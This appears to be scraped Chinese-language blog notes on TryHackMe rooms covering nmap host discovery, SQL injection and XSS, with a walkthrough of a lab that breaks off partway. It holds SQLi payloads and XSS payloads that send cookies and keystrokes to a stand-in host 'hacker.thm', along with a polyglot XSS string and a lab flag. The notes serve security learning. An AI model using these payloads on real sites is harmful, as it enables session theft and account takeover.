<td style="text-align: center;"><code>sudo nmap -PU53,161,162 -sn MACHINE_IP/30</code></td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr class="header">
<th style="text-align: center;">Option</th>
<th style="text-align: center;">Purpose</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;"><code>-n</code></td>
<td style="text-align: center;">no DNS lookup</td>
</tr>
<tr class="even">
<td style="text-align: center;"><code>-R</code></td>
<td style="text-align: center;">reverse-DNS lookup for all hosts</td>
</tr>
<tr class="odd">
<td style="text-align: center;"><code>-sn</code></td>
<td style="text-align: center;">host discovery only</td>
</tr>
</tbody>
</table>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/02/28/SQL%E6%B3%A8%E5%85%A5/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/hxt.jpg">
      <meta itemprop="name" content="hxt">
      <meta itemprop="description" content="May the Force be with you.">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hxt's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/SQL%E6%B3%A8%E5%85%A5/" class="post-title-link" itemprop="url">SQL注入（SQLi）</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2023-02-28 14:30:13" itemprop="dateCreated datePublished" datetime="2023-02-28T14:30:13+08:00">2023-02-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2023-06-10 15:53:49" itemprop="dateModified" datetime="2023-06-10T15:53:49+08:00">2023-06-10</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/TryHackMe/" itemprop="url" rel="index"><span itemprop="name">TryHackMe</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>2.4k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>2 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>TryHackMe实验房间：https://tryhackme.com/room/sqlinjectionlm</p>
<h2 id="introduction">Introduction</h2>
<p>使用 SQL 的web应用程序可以转变为 SQL
注入的关键点在于用户提供的数据被包含在 SQL 查询中。</p>
<p>假设，你遇到了一个在线博客，每个博客条目都有一个唯一的 id
号，博客条目可以设置为公共或私有，这取决于它们是否已经准备好公开发布，博客条目的
URL 可能如下所示：</p>
<p><code>https://website.thm/blog?id=1</code></p>
<p>从上面的 URL 中，你可以看到所选的博客条目来自查询字符串(query
string)中的 id
参数。Web应用程序需要从数据库中检索文章，并使用如下的SQL语句：</p>
<p><code>SELECT * from blog where id=1 and private=0 LIMIT 1;</code></p>
<p>发现上面的SQL语句正在博客表中查找 id 号为 1
且<code>private</code>列设置为 0
的文章，这意味着它可以被公众查看，并且使用了<code>limit</code>将结果限制为只有一个匹配项。</p>
<p>正如在本文开头所提到的，当用户输入的数据被引入数据库查询时，就会引入SQL注入。在本例中，查询字符串中的
id 参数直接用于 SQL 查询。</p>
<p>假设文章 id 2
仍然锁定为私有的，所以它不能在网站上查看。我们现在可以将 URL 改为：</p>
<p><code>https://website.thm/blog?id=2;--</code></p>
<p>对应生成的 SQL 语句为：</p>
<p><code>SELECT * from blog where id=2;-- and private=0 LIMIT 1;</code></p>
<p>URL 中的分号表示 SQL
语句的结束，两个横杠(<code>--</code>)会导致之后的所有内容都被视为注释。通过这样做，实际上是在运行查询：</p>
<p><code>SELECT * from blog where id=2;--</code></p>
<p>无论是否将其设置为公开，它将返回 id 为 2 的文章。</p>
<h2 id="分类">分类</h2>
<h3 id="in-band-sqli">In-Band SQLi</h3>
<p>In-Band SQL 注入是最容易检测和利用的类型。In-Band
是指使用相同通信方法来利用漏洞并接受结果。例如，在网页上发现 SQL
注入漏洞，然后能够从数据库中将数据提取到同一页面。</p>
<ul>
<li><p><strong>Error-Based SQL Injection</strong>(基于报错的SQL注入)</p>
<p>这种类型的 SQL
注入对于轻松获取有关数据库结构的信息是最有用的，因为来自数据库的错误信息会直接打印到网页上，这通常可以用于枚举整个数据库。</p></li>
<li><p><strong>Union-Based SQL Injection</strong>(基于 union
的SQL注入)</p>
<p>这种类型的注入使用 UNION 操作符和 SELECT
语句一起向页面返回其他结果。这是通过SQL注入漏洞提取大量数据的最常见方法。</p></li>
</ul>
<h3 id="blind-sqli">Blind SQLi</h3>
<p>与 in-band SQL 注入不同，blind SQL
注入几乎没有反馈来提示我们我们是否注入成功，这是因为错误消息已被禁用，但无论如何，注入依旧是有效的。</p>
<ul>
<li><p>Authentication Bypass(身份验证绕过)</p>
<p>最直接的 blind SQLi
技巧之一就是绕过登录表单等身份验证。连接到用户数据库的登录表单通常以这样的方式开发，即：web应用程序对用户名和密码的内容不感兴趣，而等关注两者是否在用户表中匹配。基本上，web应用程序会询问数据库“您是否是用户名为
<strong>bob</strong> 、密码为 <strong>bob123</strong>
的用户？”，数据库会回答“是”或“否”，并根据回答决定web应用程序是否允许你继续操作。</p></li>
<li><p><strong>Boolean Based</strong>(布尔盲注)</p>
<p>布尔盲注是指我们从注入尝试中收到的可能是<code>true/false</code>、<code>yes/no</code>、<code>on/off</code>、<code>1/0</code>或者任何只能有两个结果的响应。该结果表明攻击者的
SQL
注入是否成功。虽然响应只有两种结果，但还是能够枚举整个数据库的结构和内容。</p>
<p>例如，可以通过布尔盲注来判断数据库的首字母(<code>admin123' UNION SELECT 1,2,3 where database() like 's%';--</code>)。</p></li>
<li><p><strong>Time Based</strong>(时间盲注)</p>
<p>时间盲注与上述的布尔盲注非常相似，因为发送相同的请求，但没有直观的指示您的查询是错误的还是正确的。相反，正确查询的指标是基于完成查询所需的时间。这种时间延迟是通过在
UNION 语句旁边使用内置方法（如
<strong>SLEEP(x)</strong>）引入的。SLEEP() 方法只能在 UNION SELECT
语句成功时执行。</p>
<p>例如，当试图确定表中的列数时，可以使用以下查询：</p>
<p><code>admin123' UNION SELECT SLEEP(5)</code></p>
<p>如果未产生停顿，那么我们可以推断出该请求未成功，所以我们增加一列：</p>
<p><code>admin123' UNION SELECT SLEEP(5),2;--</code></p>
<p>直到产生 5 秒延迟为止。</p></li>
</ul>
<h3 id="out-of-band-sqli">Out of Band SQLi</h3>
<p>此类 SQL
注入并不常见，因为它要么取决于数据库服务器上启用的特定功能，要么取决于web应用程序的业务逻辑，后者根据SQL查询的结果进行某种外部网络调用。</p>
<p>Out-Of-Band
攻击通过两个不同的通信渠道进行分类，一个用于发起攻击，另一个用于收集结果。例如，攻击通道可以是web请求，数据收集通道可以监视对你控制的服务发出的HTTP/DNS请求。</p>
<p>1） 攻击者通过注入 payload 向易受攻击的网站发出请求。</p>
<p>2） 该网站对数据库进行SQL查询，并传递黑客的 payload 。</p>
<p>3） payload
包含一个请求，该请求强制将包含数据库数据的HTTP请求返回给黑客的计算机。</p>
<h2 id="预防措施">预防措施</h2>
<h3 id="预编译语句参数化查询">预编译语句（参数化查询）</h3>
<p>开发人员首先编写 SQL
查询，然后将任何用户输入作为参数添加。编写准备好的语句可以确保 SQL
代码结构不变，并且数据库可以区分查询和数据。作为一个好处，它还使您的代码看起来更干净、更容易阅读。</p>
<h3 id="对输入进行验证">对输入进行验证</h3>
<p>输入验证可以在很大程度上保护输入到 SQL
查询中的内容。使用允许列表可以将输入限制为仅某些字符串，或者编程语言中的字符串替换方法可以过滤你希望允许或不允许的字符。</p>
<h3 id="对用户输入进行转义">对用户输入进行转义</h3>
<p>允许用户输入包含诸如<code>'</code>、<code>"</code>、<code>$</code>、<code>\</code>之类的字符可能会导致SQL查询中断，或者更糟的是，正如我们所了解的那样，打开它们以接受注入攻击。转义用户输入是在这些字符前面加上反斜杠（）的方法，这样会导致它们被解析为常规字符串而不是特殊字符。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/02/28/XSS/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/hxt.jpg">
      <meta itemprop="name" content="hxt">
      <meta itemprop="description" content="May the Force be with you.">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hxt's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/XSS/" class="post-title-link" itemprop="url">XSS</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2023-02-28 14:30:13" itemprop="dateCreated datePublished" datetime="2023-02-28T14:30:13+08:00">2023-02-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2023-06-10 15:53:29" itemprop="dateModified" datetime="2023-06-10T15:53:29+08:00">2023-06-10</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/TryHackMe/" itemprop="url" rel="index"><span itemprop="name">TryHackMe</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>7.2k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>7 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>TryHackMe实验房间：https://tryhackme.com/room/xssgi</p>
<h2 id="introduction">Introduction</h2>
<p><strong>XSS</strong> 即跨站脚本攻击(Cross-Site
Scripting)是一种注入攻击，将恶意的 JavaScript
语句注入到web应用程序中，使得其他用户执行该恶意代码。</p>
<h2 id="xss-payloads">XSS Payloads</h2>
<p>在 XSS 中，payload 是我们希望执行在目标计算机上的 JavaScript
代码。Payload 包含两部分：intention 和 modification。</p>
<p>Intention 就是你希望 JavaScript 代码执行的操作，而 modification
则是我们需要基于不同情况对代码的更改。</p>
<p>下面是一些常见的 XSS intention。</p>
<h3 id="proof-of-concept概念验证">Proof Of Concept（概念验证）</h3>
<p>利用一段简单的代码，验证和检测漏洞的存在，这样的代码叫做POC（Proof Of
Concept的缩写）。</p>
<p>这是最简单的
payload，通常是通过在web页面上弹出带有文本的警告框来实现的。例如：</p>
<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt; <span class="title function_">alert</span>(<span class="string">'XSS'</span>); &lt;/script&gt;</span><br></pre></td></tr></tbody></table></figure>
<h3 id="session-stealingsession会话窃取">Session
Stealing（session会话窃取）</h3>
<p>用户会话的详细信息（例如登录token）通常保存在目标计算机上的 cookie
中。下面的JavaScript代码获取目标计算机的 cookie 后，使用 base64
对其进行编码以保证成功传输，然后将其发送到攻击者控制的网站上以便记录。一旦攻击者拥有这些
cookie，他们就可以接管目标的会话并作为目标用户登录。</p>
<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">fetch</span>(<span class="string">'https://hacker.thm/steal?cookie='</span> + <span class="title function_">btoa</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>));&lt;/script&gt;</span><br></pre></td></tr></tbody></table></figure>
<h3 id="key-logger键盘记录">Key Logger（键盘记录）</h3>
<p>下面的代码充当了键盘记录器，意味着目标在网页上键入的任何内容都将被发送到黑客控制的网站。如果将该类型的
payload
被放置在目标网站上用于接收用户登录或信用卡详细信息，这可能会造成很大的损失。</p>
<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="variable language_">document</span>.<span class="property">onkeypress</span> = <span class="keyword">function</span>(<span class="params">e</span>) { <span class="title function_">fetch</span>(<span class="string">'https://hacker.thm/log?key='</span> + <span class="title function_">btoa</span>(e.<span class="property">key</span>) );}&lt;/script&gt;</span><br></pre></td></tr></tbody></table></figure>
<h3 id="business-logic业务逻辑">Business Logic（业务逻辑）</h3>
<p>这个类型的 payload 会调用特定的网络资源或 JavaScript
函数，例如一个用于更改用户电子邮件的 JavaScript
函数<code>user.changeEmail()</code>，payload 如下：</p>
<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;user.<span class="title function_">changeEmail</span>(<span class="string">'attacker@hacker.thm'</span>);&lt;/script&gt;</span><br></pre></td></tr></tbody></table></figure>
<p>现在，目标邮件地址已被更改，攻击者可以重置密码，实现攻击。</p>
<h2 id="types-of-xss">Types Of XSS</h2>
<h3 id="reflected-xss反射型xss">Reflected XSS（反射型XSS）</h3>
<p>当用户在HTTP请求中提供的数据未经任何验证就包含在网页源中时，就会发生反射型XSS。</p>
<ul>
<li><p>示例：</p>
<p>一个网站，如果输入不符合规范的字符串，就会显示错误信息，而错误信息的内容是从查询字符串（query
string）中的 <strong>error</strong>
参数获取的，并直接构建到页面源中。</p>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230110002430576.png" alt="image-20230110002430576">
<figcaption aria-hidden="true">image-20230110002430576</figcaption>
</figure>
<p>应用程序不检查 <strong>error</strong>
参数中的内容，使得攻击者可以插入恶意代码，如下图所示：</p>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230110002600690.png" alt="image-20230110002600690">
<figcaption aria-hidden="true">image-20230110002600690</figcaption>
</figure></li>
<li><p>潜在影响：</p>
<p>攻击者可以在另一个网站上发送链接或将其嵌入另一个包含JavaScript
payload的网站上的 <strong>iframe</strong> 中(iframe是嵌入式框架,
是html标签,
用来在页面嵌入其他页面)，使得受害者在浏览器中执行代码，从而获取用户会话和信息。</p></li>
<li><p>如何测试反射型XSS：</p>
<p>切入点包括：</p>
<ol type="1">
<li>URL query string 中的参数</li>
<li>URL 文件路径</li>
<li>HTTP 头部信息</li>
</ol></li>
</ul>
<h3 id="stored-xss存储型xss">Stored XSS（存储型XSS）</h3>
<p>顾名思义，存储型XSS的 payload
存储在web应用程序上(例如数据库)，然后在其他用户访问站点或网页时运行。</p>
<ul>
<li><p>示例：</p>
<p>一个允许用户发布评论的博客网站，但是该网站并没有对评论进行过滤检查，因此可能包含恶意代码。如果我们现在发布包含JavaScript代码的评论，则会被存储在数据库，因此当其他用户访问该文章时将会在他们的浏览器上执行该JavaScript代码。</p></li>
<li><p>潜在影响：</p>
<p>恶意的JavaScript代码可以将用户重定向到另一个网站，窃取用户的会话
cookie 或是冒充当前用户执行其他操作。</p></li>
<li><p>如何测试存储型XSS：</p>
<p>你需要测试每个可能存储数据的入口点，并将恶意代码显示在其他用户可以看到的地方，例如：</p>
<ol type="1">
<li>博客上的评论</li>
<li>用户的个人资料信息</li>
<li>网站列表</li>
</ol>
<p>有时开发人员认为在客户端上限制用户的输入值是一个好的保护方案，因此将输入值更改为web应用程序不期望的值可能会发现存储型XSS。例如，开发人员期望用户通过下拉菜单选择一个整数作为
<strong>age</strong>
的值，而我们可以尝试手动发送请求，以达到攻击的目的。</p></li>
</ul>
<h3 id="dom-based-xssdom型xss">DOM Based XSS（DOM型XSS）</h3>
<ul>
<li><p>DOM是什么？</p>
<p>DOM即文档对象模型（<strong>D</strong>ocument <strong>O</strong>bject
<strong>M</strong>odel），是 HTML 和 XML 文档的应用程序编程接口
(API)，它代表一个页面，以便程序可更改文档结构、样式和内容。网页是一个文档，改文档可以在浏览器窗口中显示或作为
HTML 源显示。下面是关于 HTML DOM 的图：</p>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230110111213075.png" alt="image-20230110111213075">
<figcaption aria-hidden="true">image-20230110111213075</figcaption>
</figure></li>
<li><p>Exploiting the DOM</p>
<p>DOM型XSS能够使得JavaScript代码直接在浏览器上执行，无需加载任何新页面或是提交数据给后端代码。当网站上的JavaScript代码用作输入或与用户交互作用时，则会执行该代码。</p></li>
<li><p>示例：</p>
<p>假设一个网站的JavaScript代码从<code>window.location.hash</code>参数中获取内容，然后将其写入当前正在查看的页面中。如果没有检查哈希的内容是否含有恶意代码，使得攻击者可以将JavaScript代码注入当前网页中。</p></li>
<li><p>潜在影响：</p>
<p>攻击者将精心设计的链接发送给受害者，将他们重定向到另一个网站，或从当前页面、用户会话窃取内容。</p></li>
<li><p>如何测试 DOM型 XSS：</p>
<p>测试DOM型 XSS 是很有挑战性的，需要大量的 JavaScript
知识去阅读源代码。你需要查找攻击者可以控访问并且控制的变量
的代码部分，例如 <strong>window.location.x</strong> 参数。</p>
<p>当你找到这些代码后，你需要查看它们是如何处理的，以及这些值是否被写入网页的
DOM 中或是传递给不安全的 JavaScript 方法(methods)，例如
<strong>eval()</strong> 。</p></li>
</ul>
<h3 id="blind-xss">Blind XSS</h3>
<p>Blind XSS 类似于存储型XSS。攻击者的 payload
存储在网站上，供其他用户查看，但在这种情况下，攻击者无法看到 payload
的工作情况，也自行无法测试它。</p>
<ul>
<li><p>示例：</p>
<p>假设网站上有一个联系表单，你可以通过该表单联系相关成员，消息内容不会被过滤和检查。这使得攻击者可以输入他们想要的任何内容，然后这些消息被转换为支持票，员工们可以在私有网站上查看，从而触发
XSS 攻击。</p></li>
<li><p>潜在影响：</p>
<p>攻击者使用对应的payload可以将员工门户 URL
、员工的cookie信息甚至正在查看的页面内容回调给攻击者的网站。接着，攻击者可能劫持工作人员的会话并访问私有门户。</p></li>
<li><p>如何测试 Blind XSS</p>
<p>在测试 blind XSS 漏洞时，你需要确保payload有回调(通常是 HTTP
请求)，这样你就能知道代码是否以及何时被执行。</p>
<p>对于 blind XSS 漏洞，常用的工具是 <a target="_blank" rel="noopener" href="https://xsshunter.com/">XSShunter</a> 。你可以用 JavaScript
制作自己的工具，但该工具会自动捕获cookie、URL、页面内容等。</p></li>
</ul>
<h2 id="实验">实验</h2>
<h3 id="level-one">Level One</h3>
<p>在输入框中随便输入一串字符查看结果，如下图所示：</p>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230110220357722.png" alt="image-20230110220357722">
<figcaption aria-hidden="true">image-20230110220357722</figcaption>
</figure>
<p>右键查看网页源代码，发现相关代码：</p>
<figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"text-center"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>Hello, hxt<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>
<p>回到初始页面，直接尝试输入 payload
：<code>&lt;script&gt;alert('THM');&lt;/script&gt;</code>，成功显示弹窗。</p>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230110220703361.png" alt="image-20230110220703361">
<figcaption aria-hidden="true">image-20230110220703361</figcaption>
</figure>
<h3 id="level-two">Level Two</h3>
<p>尝试输入上一关的 payload ，发现失败，查看源代码，如下：</p>
<figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"text-center"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>Hello, <span class="tag">&lt;<span class="name">input</span> <span class="attr">value</span>=<span class="string">"&lt;script&gt;alert('THM');&lt;/script&gt;"</span>&gt;</span><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>
<p>发现输入的字符被嵌入到了<code>input</code> 标签
中，于是应该尝试闭合该标签
，然后再运行<code>&lt;script&gt;alert('THM');&lt;/script&gt;</code>。所以最终的
payload
为<strong><code>"&gt;&lt;script&gt;alert('THM');&lt;/script&gt;</code></strong>。</p>
<h3 id="level-three">Level Three</h3>
<p>输入<code>&lt;script&gt;alert('THM');&lt;/script&gt;</code>，点击<code>Enter</code>后，查看源代码：</p>
<figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"text-center"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>Hello, <span class="tag">&lt;<span class="name">textarea</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">'THM'</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>
<p>发现代码被嵌入到了<code>textarea</code> 标签 中，类似于 level two
，需要将<code>textarea</code>闭合，因此 payload
为：<code>&lt;/textarea&gt;&lt;script&gt;alert('THM');&lt;/script&gt;</code>。</p>
<h3 id="level-four">Level Four</h3>
<p>步骤如上，查看源代码：</p>
<figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        document.getElementsByClassName('name')[0].innerHTML='<span class="tag">&lt;/<span class="name">textarea</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">'THM'</span>);</span></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>';</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>
<p>也是需要进行闭合处理，payload
为：<code>';alert('THM');//</code>。</p>
<h3 id="level-five">Level Five</h3>
<p>输入代码后，查看源代码：</p>
<figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"text-center"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>Hello, <span class="tag">&lt;&gt;</span>alert('THM');<span class="tag">&lt;/&gt;</span><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>
<p>发现<code>script</code>被过滤掉了，因此 payload
为：<code>&lt;sscriptcript&gt;alert('THM');&lt;/sscriptcript&gt;</code>。</p>
<h3 id="level-six">Level Six</h3>
<p>输入框有默认的字符串，点击<code>Enter</code>按钮后如下图所示：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230110225019628.png" alt="image-20230110225019628" style="zoom:67%;"></p>
<p>源代码为：</p>
<figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"text-center"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>Your Picture<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"/images/cat.jpg"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>
<p>尝试 level two 的 payload ，变化后的源代码如下：</p>
<figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"text-center"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>Your Picture<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">""</span><span class="attr">scriptalert</span>('<span class="attr">THM</span>');/<span class="attr">script</span>"&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>
<p>发现<code>&lt;</code>、<code>&gt;</code>这两个符号被过滤了，为了绕过过滤器，我们可以利用<code>img</code>标签的其他属性，例如<code>onload</code>事件，一旦<code>src</code>属性中指定的图像加载到网页上，该事件将执行指定的代码。因此
payload 为：<code>/images/cat.jpg" onload="alert('THM');</code>。</p>
<p>得到flag：<code>THM{XSS_MASTER}</code>。</p>
<h3 id="polyglots">Polyglots</h3>
<p>XSS polyglot 是一串文本，算是通用 payload
，可以闭合属性、闭合标签以及绕过过滤器。
你可以在刚刚完成的六个关卡中使用以下 payload，并且都会成功执行。</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert('THM')//&gt;\x3e</span><br></pre></td></tr></tbody></table></figure>
<h3 id="blind-xss-1">Blind XSS</h3>
<p>在目标网站上创建新用户，然后在 <strong>Support Tickets</strong>
选项并创建新的 <strong>Ticket</strong> ，如下图所示：</p>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230110232709300.png" alt="image-20230110232709300">
<figcaption aria-hidden="true">image-20230110232709300</figcaption>
</figure>
<p>然后点击该 ticket 的 id 号跳转到 ticket
详情页面，查看该页面源代码，发现关键字：</p>
<figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel-body"</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">label</span>&gt;</span>Status:<span class="tag">&lt;/<span class="name">label</span>&gt;</span> Open<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">label</span>&gt;</span>Ticket Id:<span class="tag">&lt;/<span class="name">label</span>&gt;</span> 4<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">label</span>&gt;</span>Ticket Subject:<span class="tag">&lt;/<span class="name">label</span>&gt;</span> test<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">label</span>&gt;</span>Ticket Created:<span class="tag">&lt;/<span class="name">label</span>&gt;</span> 10/01/2023 15:26<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">label</span>&gt;</span>Ticket Contents:<span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">textarea</span> <span 